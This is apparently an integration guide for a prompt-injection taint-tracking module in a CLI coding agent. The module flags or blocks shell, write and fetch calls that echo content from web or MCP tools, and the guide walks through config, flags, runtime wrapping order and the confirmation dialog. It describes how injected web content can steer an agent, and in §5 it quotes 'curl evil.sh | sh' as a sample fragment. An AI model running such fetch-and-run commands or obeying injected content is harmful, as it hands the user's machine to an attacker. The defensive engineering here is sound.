# Wiring PROMPT-INJECTION TAINT TRACKING into the CLI

This document is the integration recipe for `packages/cli/src/taint.ts` (new
file, already in the tree with `taint.test.ts`, 41 passing tests). Per the
task's hard rules **no existing file was edited** to produce this feature — the
snippets below are exact instructions for whoever wires it into `config.ts`,
`args.ts`, `runtime.ts` and (optionally) `index.ts`.

The goal in one line: content that entered the conversation from the untrusted
internet is remembered, and a mutating tool call that parrots it back can be
warned about, confirmed, or refused. "A webpage told the agent to run this"
becomes a detectable event instead of an invisible one.

## 1. What's already built

`packages/cli/src/taint.ts` exports:

```ts
createTaintTracker(options?: TaintTrackerOptions): TaintTracker

interface TaintTracker {
  observe(toolName: string, resultText: string): void;   // no-op for trusted tools
  assess(toolName: string, input: Record<string, unknown>): TaintVerdict;
  isSource(toolName: string): boolean;                   // fetch/websearch/mcp*
  isMutating(toolName: string): boolean;                 // bash/write/edit/fetch
  markers(): TaintMarker[];                              // debug/UI snapshot
  reset(): void;                                         // on /clear
}

interface TaintVerdict { tainted: boolean; matches: string[]; reason?: string }

type TaintPolicy = "off" | "warn" | "confirm" | "deny";
type TaintConfirmer = (verdict, toolName, input) => Promise<boolean>;

wrapToolsWithTaint(
  tools: readonly Tool[],
  tracker: TaintTracker,
  options: { policy: TaintPolicy; confirm?: TaintConfirmer; onDetect?: (verdict, toolName) => void },
): Tool[]
```

Plus tunables and message builders: `TaintTrackerOptions`
(`sources`, `sourcePrefixes`, `mutatingTools`, `minTokenLength`,
`minCommandLength`, `requireDigitInTokens`, `maxMarkers`),
`DEFAULT_TAINT_SOURCES`, `DEFAULT_TAINT_SOURCE_PREFIXES`,
`DEFAULT_MUTATING_TOOLS`, `DEFAULT_MIN_TOKEN_LENGTH`,
`DEFAULT_MIN_COMMAND_LENGTH`, `DEFAULT_MAX_MARKERS`, `extractTaintMarkers`,
`serializeToolInput`, `taintWarningLine`, `taintDenialMessage`.

Behaviour of the wrapper, per policy, for a **mutating** tool whose input
echoes remembered untrusted text:

| policy    | tool runs? | result                                                        |
| --------- | ---------- | ------------------------------------------------------------- |
| `off`     | yes        | untouched (but untrusted output is still observed)             |
| `warn`    | yes        | a `[taint] WARNING: …` text block is prepended to the result   |
| `confirm` | only if the confirmer returns `true` | otherwise an `isError` refusal    |
| `deny`    | no         | `isError` refusal explaining why, in terms the model can act on |

Non-mutating tools are never blocked; tools that are neither an untrusted
source nor a mutating sink are returned unwrapped. Untrusted output is
observed under **every** policy, so flipping `taint` on mid-session (or via
`/taint`) has history to work with. Failed (`isError`) results are not
observed — an error body is the tool's own diagnostics, not fetched content.

False-positive posture (the design's main risk) is documented at length in the
module TSDoc: markers are only command-shaped line fragments, URLs/absolute
paths/base64 blobs, and long tokens that mix letters *and* digits. Ordinary
long words (`configuration`) and digitless identifiers (`package.json`,
`node_modules`) are deliberately never remembered. Five of the 41 tests fail if
that guard is removed — verified by mutation.

## 2. `packages/cli/src/config.ts` — add a `taint` key

**Import** (next to the existing `./hooks.js` import, line 23):

```ts
import type { TaintPolicy } from "./taint.js";
```

**Interface** (after `ArcturnConfig.sandbox`, around line 63):

```ts
  /** How to handle a mutating tool call that echoes untrusted content (default "warn"). */
  taint: TaintPolicy;
```

**Default** (in `DEFAULT_CONFIG`, after `sandbox`, around line 109):

```ts
  taint: "warn" as TaintPolicy,
```

`"warn"` is the right default: it is the only setting that is both useful on
day one and incapable of breaking a legitimate workflow. `"deny"` is the right
setting for unattended/CI runs; see §5.

**Known keys** (add to the `KNOWN_KEYS` set, around line 117):

```ts
  "taint",
```

**Parse** (beside the `sandbox` parse block, around line 321):

```ts
  if (raw.taint !== undefined) {
    if (raw.taint === "off" || raw.taint === "warn" || raw.taint === "confirm" || raw.taint === "deny") {
      out.taint = raw.taint;
    } else {
      warnings.push(`${where}: "taint" must be "off", "warn", "confirm" or "deny"`);
    }
  }
```

**Merge** (in `mergeConfig`, after the `sandbox` line, around line 356):

```ts
    taint: layer.taint ?? base.taint,
```

## 3. `packages/cli/src/args.ts` — optional `--taint <policy>` flag

Add `"--taint"` to the value-taking flag list (around line 204), then a case
beside `--permission-mode` (around line 309):

```ts
      case "--taint": {
        const value = next();
        if (value === "off" || value === "warn" || value === "confirm" || value === "deny") {
          out.taint = value;
        } else {
          errors.push(`--taint must be one of: off, warn, confirm, deny`);
        }
        break;
      }
```

The flag overrides the config layer the same way `--permission-mode` does.

## 4. `packages/cli/src/runtime.ts` — where to wrap, and why there

### 4a. Create the tracker in `buildRuntime`

Next to the hook runner (around line 888):

```ts
import { createTaintTracker, type TaintTracker, wrapToolsWithTaint } from "./taint.js";

const taint = createTaintTracker();
```

Construct it unconditionally, even for `taint: "off"` — the wrapper still
observes under `"off"`, so a user who flips the policy mid-session (§6) is not
starting from an empty memory.

### 4b. Wrap **inside** hooks, **outside** verify/LSP

The current chain in `buildRuntime` (lines ~895-903) is:

```ts
const lspTools      = lsp      ? wrapToolsWithLsp(toolsWithSymbols, lsp)  : toolsWithSymbols;
const verifiedTools = verifier ? wrapToolsWithVerify(lspTools, verifier)  : lspTools;
const hookedTools   = wrapToolsWithHooks(verifiedTools, hookRunner);
```

Insert one line:

```ts
const verifiedTools = verifier ? wrapToolsWithVerify(lspTools, verifier) : lspTools;
// Taint sits between verify and hooks: it observes the fully-annotated result
// of an untrusted call, and a user hook still sees (and can audit) a call the
// taint policy refuses.
const taintedTools = wrapToolsWithTaint(verifiedTools, taint, {
  policy: config.taint,
  confirm: (verdict, toolName) => runtimeRef.confirmTaint(verdict, toolName),  // §4d
  // Optional: surface detections on the status line / in warnings.
  onDetect: (verdict, toolName) => {
    warnings.push(`taint: ${toolName} call echoes untrusted content — ${verdict.reason ?? ""}`);
  },
});
const hookedTools = wrapToolsWithHooks(taintedTools, hookRunner);
```

**Why hooks outermost (taint inside):**

1. *A hook deny must stay final.* Hooks are the user's own policy layer. With
   hooks on the outside, a `preToolUse` deny short-circuits before taint even
   looks at the call — the user's veto is never second-guessed, and no
   confirmation dialog is raised for a call that was already dead.
2. *A taint block stays visible to the user's tooling.* With hooks outside, a
   taint refusal is just the result the hook wrapper receives, so `postToolUse`
   fires with `isError: true` and the refusal text. Audit hooks, logging hooks
   and the audited hook runner all record the blocked attempt. If taint wrapped
   outside hooks instead, blocked injection attempts would be invisible to
   exactly the tooling a security-conscious user installed to see them. (No
   change to `audit.ts` is needed for this: `auditedHookRunner` already records
   the `postToolUse` verdict. Recording detections as a *first-class* audit
   entry would mean adding a variant to the closed `AuditEntry` union — a
   separate, optional change.)
3. *A hook allow is not a taint allow.* Defense in depth runs both layers on
   every call that survives the first.

**Why outside verify/LSP:** those wrappers append diagnostics and verification
failures to the result. Observing the outermost result means the tracker sees
everything the model will see. (For the actual untrusted sources — `fetch`,
`websearch`, MCP — verify/LSP do not wrap them at all, so in practice the
observed text is the raw tool output either way.)

**Checkpoints stay outermost of all**, as today, in `#agentOptions`: a
checkpoint should be taken around the call that actually happened.

### 4c. Wrap MCP tools too — this is not optional

MCP servers are untrusted sources by default (`mcp*` prefix). `attachMcpTools`
(line ~530) wraps late-arriving MCP tools separately, so it needs the same
treatment or MCP content is never observed:

```ts
  attachMcpTools(tools: Tool[]): void {
    this.#mcpTools = wrapToolsWithHooks(
      wrapToolsWithTaint([...tools], this.#taint, this.#taintOptions),
      this.#hookRunner,
    );
    // …unchanged…
  }
```

Store the tracker and the wrap options on the runtime (`#taint`,
`#taintOptions`) from `ArcturnRuntimeInit`, exactly as `#hookRunner` is stored
today (fields around lines 378/403, init interface around line 319).

### 4d. Reset on `/clear` and on session swap

Markers are conversation-scoped. In `#swap` (line ~669), beside the metrics
reset:

```ts
  #swap(next: Agent): void {
    this.#detach?.();
    this.agent = next;
    this.metrics = { turns: 0, usage: emptyUsage(), costUsd: 0 };
    this.#taint.reset();   // a discarded transcript must not haunt the next one
    this.#attach(next);
  }
```

Note the deliberate asymmetry with `/rewind`: rewinding drops messages but the
model has already *seen* the untrusted content in this process, so markers are
kept. Only a genuinely new conversation clears them.

## 5. `"confirm"` reaches the TUI through the existing permission dialog

Do **not** invent a second prompt. The runtime already owns a
`PermissionPrompt` (`#requester`, set from `ArcturnRuntimeOptions.onPermissionAsk`,
line ~412) which the TUI fulfils in `interactive/app.ts` (line ~603) by showing
`permissionDialog(request, width, glyphs)` from `interactive/dialogs.ts`. A
taint confirmation is exactly a permission request with a scarier description,
so route it through the same path:

```ts
import { randomUUID } from "node:crypto";
import { taintWarningLine, type TaintVerdict } from "./taint.js";

  /** Ask the user to approve a tool call that echoes untrusted content. */
  async confirmTaint(verdict: TaintVerdict, toolName: string): Promise<boolean> {
    const decision = await this.#ask({
      id: `taint-${randomUUID()}`,
      toolName,
      toolCallId: `taint-${Date.now()}`,
      subject: verdict.matches[0] ?? toolName,
      description: taintWarningLine(verdict, toolName),
    });
    return decision.behavior === "allow";
  }
```

Three details that matter:

- **No `suggestedRule`, and `persistRule` is ignored.** `#ask` calls the host
  prompt directly rather than going through the core permission engine, so
  nothing is persisted. A taint confirmation must be one-shot: "allow this
  call" can never become "allow every future call that quotes a web page".
  Because `permissionDialog` always renders an "Allow always" row, treat
  `always` as allow-once (the code above already does — it only looks at
  `behavior`). If the wording bothers you later, the minimal follow-up is a
  `taintDialog` in `dialogs.ts` reusing `createChoice` with two options
  (`Run anyway` / `Block and tell the model why`) — a variant of the existing
  component, not a new prompt mechanism.
- **`subject` is the matched marker**, so the dialog's header line shows the
  actual injected fragment (`curl evil.sh | sh`) rather than a generic label,
  and `toolGlyph(toolName)` still renders the right tool icon.
- **Headless fails closed.** In `-p`/print mode there is no requester, so
  `#ask` returns `behavior: "deny"` and the confirmer returns `false` — the
  tainted call is refused with the "user declined" message. That is the correct
  default for unattended runs, but prefer an explicit `taint: "warn"` or
  `"deny"` there so the behaviour is intentional rather than incidental.
- **The confirmer receives no `ToolExecutionContext`** (the signature is
  `(verdict, toolName, input)`). It therefore cannot use
  `ctx.requestPermission`; closing over the runtime's `#ask`, as above, is the
  intended wiring. If a future caller needs per-call context (e.g. the
  `toolCallId` for correlation over the ACP/server transport), add an optional
  fourth parameter to `TaintConfirmer` — the wrapper has `ctx` in scope and can
  pass it through without any other change.

## 6. Optional extras

- **`/taint [off|warn|confirm|deny]` slash command** in `commands.ts`, mirroring
  the existing mode commands. Because the wrapper reads `options.policy` on
  every call, make the runtime hold a mutable `#taintOptions` object and mutate
  `policy` in place; no re-wrapping is needed and observation never stops.
- **`/taint list`** to dump `tracker.markers()` for debugging a false positive:
  each entry carries its `kind` (`command`/`artifact`/`token`) and the source
  tool it came from.
- **Export from `index.ts`** (beside `wrapToolsWithHooks`, line ~124) so SDK
  embedders can build their own policy:
  `createTaintTracker`, `wrapToolsWithTaint`, `taintWarningLine`,
  `taintDenialMessage`, and the `TaintPolicy`/`TaintVerdict`/`TaintTracker`
  types.
- **Tuning escape hatch.** If a user reports false positives, the first move is
  `createTaintTracker({ minTokenLength: 20 })` or a narrower `mutatingTools`
  list; if they report misses, `requireDigitInTokens: false` (noisier, catches
  digitless identifiers). Both are constructor options today, so a
  `taintTuning` config key can be added later with no change to `taint.ts`.

## 7. Verification performed

```
npx vitest run packages/cli/src/taint.test.ts   # 41 passed
npx tsc -p packages/cli/tsconfig.json --noEmit  # clean (plus a scratch project that
                                                #  includes the test file: clean)
npx biome check packages/cli/src/taint.ts packages/cli/src/taint.test.ts  # clean
```
